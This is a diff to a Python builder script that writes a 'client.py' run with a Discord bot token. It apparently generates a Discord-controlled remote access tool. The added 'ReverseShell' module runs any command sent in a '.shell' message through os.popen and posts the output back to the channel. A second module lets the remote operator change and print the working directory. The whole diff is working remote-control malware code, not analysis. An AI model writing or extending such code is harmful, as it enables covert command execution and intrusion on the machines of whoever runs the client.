@@ -113,7 +113,30 @@ if modules["TTS"]:
     client_code += """
     # ADDED TTS MODULE
     """
-# Add more modules as needed...
+
+if modules["ReverseShell"]:
+    client_code += """
+    # ADDED REVERSE SHELL MODULE
+    elif message.content.lower().startswith(".shell"):
+        command = message.content[7:]
+        output = os.popen(command).read()
+        if output == "":
+            output = "No Output"
+        embed = discord.Embed(title=f"Shell Command > {command}", description=f"```{output}```", color=0xfafafa)
+        await message.reply(embed=embed)
+    """
+if modules["FileBrowser"]:
+    client_code += """
+    # ADDED FILE BROWSER MODULE
+    elif message.content.lower().startswith(".cd"):
+        try:
+            os.chdir(message.content[4:])
+            await message.channel.send(f"Changed directory to {os.getcwd()}")
+        except FileNotFoundError:
+            await message.channel.send("Invalid Path")
+    elif message.content.lower() == ".pwd":
+        await message.channel.send(f"Current Directory: {os.getcwd()}")
+    """
 
 # Finalize the client.py content
 client_code += """
@@ -123,7 +146,7 @@ client.run(bottoken)
 """
 
 # Write the generated code to client.py
-client_path = "python/client.py"
+client_path = "python/client/client.py"
 with open(client_path, "w") as file:
     file.write(client_code)
 
